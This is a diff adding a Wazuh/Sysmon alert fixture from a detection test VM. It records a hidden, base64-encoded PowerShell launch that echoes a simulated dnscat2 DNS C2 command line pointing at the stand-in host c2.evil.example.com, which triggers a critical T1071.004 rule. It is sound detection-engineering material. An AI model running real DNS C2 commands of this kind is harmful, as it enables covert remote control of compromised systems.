@@ -1,0 +1,91 @@
+{
+  "agent": {
+    "ip": "x.x.x.x",
+    "name": "windows-detection-vm",
+    "id": "001"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "originalFileName": "Cmd.Exe",
+        "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+        "product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "parentProcessGuid": "{f5cafcf2-999a-6a4e-7f02-000000002100}",
+        "description": "Windows Command Processor",
+        "logonGuid": "{f5cafcf2-999a-6a4e-a074-690000000000}",
+        "parentCommandLine": "powershell  -NoProfile -EncodedCommand CgAkAFAAcgBvAGcAcgBlAHMAcwBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACMAIABzAHAAYQB3AG4AIABhACAAcAByAG8AYwBlAHMAcwAgAHcAaABvAHMAZQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAbgBlACAAYwBhAHIAcgBpAGUAcwAgAHQAaABlACAAZABuAHMAYwBhAHQAMgAgAHMAaQBnAG4AYQB0AHUAcgBlACAAKABiAGkAbgBhAHIAeQAtAGEAZwBuAG8AcwB0AGkAYwApAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIgAsACIAZQBjAGgAbwAgAHMAaQBtAHUAbABhAHQAaQBuAGcAIABkAG4AcwBjAGEAdAAyACAALQAtAGQAbgBzACAAcwBlAHIAdgBlAHIAPQBjADIALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACAAJgAmACAAZQB4AGkAdAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgAkAGMAPQAoAEcAZQB0AC0AVwBpAG4ARQB2AGUAbgB0ACAALQBGAGkAbAB0AGUAcgBIAGEAcwBoAHQAYQBiAGwAZQAgAEAAewBMAG8AZwBOAGEAbQBlAD0AIgBNAGkAYwByAG8AcwBvAGYAdAAtAFcAaQBuAGQAbwB3AHMALQBTAHkAcwBtAG8AbgAvAE8AcABlAHIAYQB0AGkAbwBuAGEAbAAiADsASQBkAD0AMQA7AFMAdABhAHIAdABUAGkAbQBlAD0AKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAtADEAKQB9ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBNAGUAcwBzAGEAZwBlACAALQBtAGEAdABjAGgAIAAiAC0ALQBkAG4AcwAiAH0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACkALgBDAG8AdQBuAHQACgAiAFMAeQBzAG0AbwBuACAARQB2AGUAbgB0ADEAIAB3AGkAdABoACAALQAtAGQAbgBzADoAIAAkAGMAIgAKACIARQBYAEUAQwBfAEQATwBOAEUAIABUADEAMAA3ADEALgAwADAANAAgAEQATgBTACAAQwAyACAAcwBpAG0AIgAKAA==",
+        "processGuid": "{f5cafcf2-999b-6a4e-8002-000000002100}",
+        "logonId": "0x6974a0",
+        "parentProcessId": "2316",
+        "processId": "4116",
+        "currentDirectory": "C:\\\\Users\\\\username\\\\",
+        "utcTime": "2026-07-08 18:40:27.393",
+        "hashes": "SHA1=E59C13FDD74E1AD950C98F905795ECDEFFFB8221,MD5=629A9DE29FCD99366A66C651A535A5A6,SHA256=F682AADDA9DEB654885AE17909380A25F7CB1A43AC0934AC425EE8DE4924C7F3,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
+        "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "ruleName": "technique_id=T1059.003,technique_name=Windows Command Shell",
+        "company": "Microsoft Corporation",
+        "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" /c echo simulating dnscat2 --dns server=c2.evil.example.com &amp;&amp; exit",
+        "integrityLevel": "High",
+        "fileVersion": "10.0.26100.7920 (WinBuild.160101.0800)",
+        "user": "hostname\\\\username",
+        "terminalSessionId": "0",
+        "parentUser": "hostname\\\\username"
+      },
+      "system": {
+        "eventID": "1",
+        "keywords": "0x8000000000000000",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "level": "4",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "opcode": "0",
+        "message": "\"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2026-07-08 18:40:27.393\r\nProcessGuid: {f5cafcf2-999b-6a4e-8002-000000002100}\r\nProcessId: 4116\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7920 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\WINDOWS\\system32\\cmd.exe\" /c echo simulating dnscat2 --dns server=c2.evil.example.com && exit \r\nCurrentDirectory: C:\\Users\\username\\\r\nUser: hostname\\username\r\nLogonGuid: {f5cafcf2-999a-6a4e-a074-690000000000}\r\nLogonId: 0x6974A0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=E59C13FDD74E1AD950C98F905795ECDEFFFB8221,MD5=629A9DE29FCD99366A66C651A535A5A6,SHA256=F682AADDA9DEB654885AE17909380A25F7CB1A43AC0934AC425EE8DE4924C7F3,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {f5cafcf2-999a-6a4e-7f02-000000002100}\r\nParentProcessId: 2316\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell  -NoProfile -EncodedCommand CgAkAFAAcgBvAGcAcgBlAHMAcwBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACMAIABzAHAAYQB3AG4AIABhACAAcAByAG8AYwBlAHMAcwAgAHcAaABvAHMAZQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAbgBlACAAYwBhAHIAcgBpAGUAcwAgAHQAaABlACAAZABuAHMAYwBhAHQAMgAgAHMAaQBnAG4AYQB0AHUAcgBlACAAKABiAGkAbgBhAHIAeQAtAGEAZwBuAG8AcwB0AGkAYwApAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIgAsACIAZQBjAGgAbwAgAHMAaQBtAHUAbABhAHQAaQBuAGcAIABkAG4AcwBjAGEAdAAyACAALQAtAGQAbgBzACAAcwBlAHIAdgBlAHIAPQBjADIALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACAAJgAmACAAZQB4AGkAdAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgAkAGMAPQAoAEcAZQB0AC0AVwBpAG4ARQB2AGUAbgB0ACAALQBGAGkAbAB0AGUAcgBIAGEAcwBoAHQAYQBiAGwAZQAgAEAAewBMAG8AZwBOAGEAbQBlAD0AIgBNAGkAYwByAG8AcwBvAGYAdAAtAFcAaQBuAGQAbwB3AHMALQBTAHkAcwBtAG8AbgAvAE8AcABlAHIAYQB0AGkAbwBuAGEAbAAiADsASQBkAD0AMQA7AFMAdABhAHIAdABUAGkAbQBlAD0AKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAtADEAKQB9ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBNAGUAcwBzAGEAZwBlACAALQBtAGEAdABjAGgAIAAiAC0ALQBkAG4AcwAiAH0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACkALgBDAG8AdQBuAHQACgAiAFMAeQBzAG0AbwBuACAARQB2AGUAbgB0ADEAIAB3AGkAdABoACAALQAtAGQAbgBzADoAIAAkAGMAIgAKACIARQBYAEUAQwBfAEQATwBOAEUAIABUADEAMAA3ADEALgAwADAANAAgAEQATgBTACAAQwAyACAAcwBpAG0AIgAKAA==\r\nParentUser: hostname\\username\"",
+        "version": "5",
+        "systemTime": "2026-07-08T18:40:27.4042742Z",
+        "eventRecordID": "2803598",
+        "threadID": "4456",
+        "computer": "hostname",
+        "task": "1",
+        "processID": "3596",
+        "severityValue": "INFORMATION",
+        "providerName": "Microsoft-Windows-Sysmon"
+      }
+    }
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": true,
+    "level": 15,
+    "description": "CRITICAL: DNS C2 tool detected via command-line arguments: \\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" /c echo simulating dnscat2 --dns server=c2.evil.example.com &amp;&amp; exit",
+    "groups": [
+      "windows",
+      "persistence",
+      "sigma_coverage"
+    ],
+    "mitre": {
+      "technique": [
+        "DNS"
+      ],
+      "id": [
+        "T1071.004"
+      ],
+      "tactic": [
+        "Command and Control"
+      ]
+    },
+    "id": "100003"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-07-08T18:40:27.4042742Z\",\"eventRecordID\":\"2803598\",\"processID\":\"3596\",\"threadID\":\"4456\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"hostname\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\\r\\nUtcTime: 2026-07-08 18:40:27.393\\r\\nProcessGuid: {f5cafcf2-999b-6a4e-8002-000000002100}\\r\\nProcessId: 4116\\r\\nImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nFileVersion: 10.0.26100.7920 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft\u00ae Windows\u00ae Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: \\\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\\" /c echo simulating dnscat2 --dns server=c2.evil.example.com && exit \\r\\nCurrentDirectory: C:\\\\Users\\\\username\\\\\\r\\nUser: hostname\\\\username\\r\\nLogonGuid: {f5cafcf2-999a-6a4e-a074-690000000000}\\r\\nLogonId: 0x6974A0\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=E59C13FDD74E1AD950C98F905795ECDEFFFB8221,MD5=629A9DE29FCD99366A66C651A535A5A6,SHA256=F682AADDA9DEB654885AE17909380A25F7CB1A43AC0934AC425EE8DE4924C7F3,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\\r\\nParentProcessGuid: {f5cafcf2-999a-6a4e-7f02-000000002100}\\r\\nParentProcessId: 2316\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\nParentCommandLine: powershell  -NoProfile -EncodedCommand CgAkAFAAcgBvAGcAcgBlAHMAcwBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACMAIABzAHAAYQB3AG4AIABhACAAcAByAG8AYwBlAHMAcwAgAHcAaABvAHMAZQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAbgBlACAAYwBhAHIAcgBpAGUAcwAgAHQAaABlACAAZABuAHMAYwBhAHQAMgAgAHMAaQBnAG4AYQB0AHUAcgBlACAAKABiAGkAbgBhAHIAeQAtAGEAZwBuAG8AcwB0AGkAYwApAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIgAsACIAZQBjAGgAbwAgAHMAaQBtAHUAbABhAHQAaQBuAGcAIABkAG4AcwBjAGEAdAAyACAALQAtAGQAbgBzACAAcwBlAHIAdgBlAHIAPQBjADIALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACAAJgAmACAAZQB4AGkAdAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgAkAGMAPQAoAEcAZQB0AC0AVwBpAG4ARQB2AGUAbgB0ACAALQBGAGkAbAB0AGUAcgBIAGEAcwBoAHQAYQBiAGwAZQAgAEAAewBMAG8AZwBOAGEAbQBlAD0AIgBNAGkAYwByAG8AcwBvAGYAdAAtAFcAaQBuAGQAbwB3AHMALQBTAHkAcwBtAG8AbgAvAE8AcABlAHIAYQB0AGkAbwBuAGEAbAAiADsASQBkAD0AMQA7AFMAdABhAHIAdABUAGkAbQBlAD0AKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAtADEAKQB9ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBNAGUAcwBzAGEAZwBlACAALQBtAGEAdABjAGgAIAAiAC0ALQBkAG4AcwAiAH0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACkALgBDAG8AdQBuAHQACgAiAFMAeQBzAG0AbwBuACAARQB2AGUAbgB0ADEAIAB3AGkAdABoACAALQAtAGQAbgBzADoAIAAkAGMAIgAKACIARQBYAEUAQwBfAEQATwBOAEUAIABUADEAMAA3ADEALgAwADAANAAgAEQATgBTACAAQwAyACAAcwBpAG0AIgAKAA==\\r\\nParentUser: hostname\\\\username\\\"\"},\"eventdata\":{\"ruleName\":\"technique_id=T1059.003,technique_name=Windows Command Shell\",\"utcTime\":\"2026-07-08 18:40:27.393\",\"processGuid\":\"{f5cafcf2-999b-6a4e-8002-000000002100}\",\"processId\":\"4116\",\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"fileVersion\":\"10.0.26100.7920 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft\u00ae Windows\u00ae Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\cmd.exe\\\\\\\" /c echo simulating dnscat2 --dns server=c2.evil.example.com &amp;&amp; exit\",\"currentDirectory\":\"C:\\\\\\\\Users\\\\\\\\username\\\\\\\\\",\"user\":\"hostname\\\\\\\\username\",\"logonGuid\":\"{f5cafcf2-999a-6a4e-a074-690000000000}\",\"logonId\":\"0x6974a0\",\"terminalSessionId\":\"0\",\"integrityLevel\":\"High\",\"hashes\":\"SHA1=E59C13FDD74E1AD950C98F905795ECDEFFFB8221,MD5=629A9DE29FCD99366A66C651A535A5A6,SHA256=F682AADDA9DEB654885AE17909380A25F7CB1A43AC0934AC425EE8DE4924C7F3,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\",\"parentProcessGuid\":\"{f5cafcf2-999a-6a4e-7f02-000000002100}\",\"parentProcessId\":\"2316\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"parentCommandLine\":\"powershell  -NoProfile -EncodedCommand CgAkAFAAcgBvAGcAcgBlAHMAcwBQAHIAZQBmAGUAcgBlAG4AYwBlAD0AIgBTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACIAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAPQAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgAKACMAIABzAHAAYQB3AG4AIABhACAAcAByAG8AYwBlAHMAcwAgAHcAaABvAHMAZQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAbgBlACAAYwBhAHIAcgBpAGUAcwAgAHQAaABlACAAZABuAHMAYwBhAHQAMgAgAHMAaQBnAG4AYQB0AHUAcgBlACAAKABiAGkAbgBhAHIAeQAtAGEAZwBuAG8AcwB0AGkAYwApAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBjAG0AZAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIgAsACIAZQBjAGgAbwAgAHMAaQBtAHUAbABhAHQAaQBuAGcAIABkAG4AcwBjAGEAdAAyACAALQAtAGQAbgBzACAAcwBlAHIAdgBlAHIAPQBjADIALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACAAJgAmACAAZQB4AGkAdAAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgAkAGMAPQAoAEcAZQB0AC0AVwBpAG4ARQB2AGUAbgB0ACAALQBGAGkAbAB0AGUAcgBIAGEAcwBoAHQAYQBiAGwAZQAgAEAAewBMAG8AZwBOAGEAbQBlAD0AIgBNAGkAYwByAG8AcwBvAGYAdAAtAFcAaQBuAGQAbwB3AHMALQBTAHkAcwBtAG8AbgAvAE8AcABlAHIAYQB0AGkAbwBuAGEAbAAiADsASQBkAD0AMQA7AFMAdABhAHIAdABUAGkAbQBlAD0AKABHAGUAdAAtAEQAYQB0AGUAKQAuAEEAZABkAE0AaQBuAHUAdABlAHMAKAAtADEAKQB9ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBNAGUAcwBzAGEAZwBlACAALQBtAGEAdABjAGgAIAAiAC0ALQBkAG4AcwAiAH0AIAB8ACAATQBlAGEAcwB1AHIAZQAtAE8AYgBqAGUAYwB0ACkALgBDAG8AdQBuAHQACgAiAFMAeQBzAG0AbwBuACAARQB2AGUAbgB0ADEAIAB3AGkAdABoACAALQAtAGQAbgBzADoAIAAkAGMAIgAKACIARQBYAEUAQwBfAEQATwBOAEUAIABUADEAMAA3ADEALgAwADAANAAgAEQATgBTACAAQwAyACAAcwBpAG0AIgAKAA==\",\"parentUser\":\"hostname\\\\\\\\username\"}}}",
+  "input": {
+    "type": "log"
+  },
+  "@timestamp": "2026-07-08T18:40:28.258Z",
+  "location": "EventChannel",
+  "id": "1783536028.4341940",
+  "timestamp": "2026-07-08T18:40:28.258+0000"
+}
